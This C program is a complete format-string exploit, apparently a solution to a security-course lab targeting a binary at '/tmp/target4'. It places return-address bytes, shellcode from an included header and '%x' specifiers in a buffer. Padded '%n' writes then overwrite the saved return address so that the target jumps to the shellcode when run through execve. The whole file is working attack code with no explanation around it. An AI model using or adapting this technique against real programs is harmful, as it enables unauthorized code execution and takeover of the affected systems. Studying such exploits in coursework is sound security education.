#include "shellcode.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target4"

void write_with_padding(char *buf, size_t padding) {
  char *ptr = buf + strlen(buf);
  memset(ptr, 'A', padding);
  strcpy(ptr + padding, "%n");
}

int main(void) {
  char *args[3];
  char *env[1];

  char buf[481] = "\x9c\xfc\xff\xbf"  // ret
                  "\x9d\xfc\xff\xbf"  // ret + 1
                  "\x9e\xfc\xff\xbf"  // ret + 2
                  "\x9f\xfc\xff\xbf"; // ret + 3
  strcpy(buf + strlen(buf), shellcode);
  strcpy(buf + strlen(buf), "%x%x%x");

  // expected 0xbffffac8
  write_with_padding(buf, 0xc8 - 0x40);
  write_with_padding(buf, 0xfa - 0xc8);
  write_with_padding(buf, 0xff - 0xfa);
  write_with_padding(buf, 0x1bf - 0xff);

  memset(buf + strlen(buf), 'A', sizeof(buf) - strlen(buf));
  buf[480] = 0;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
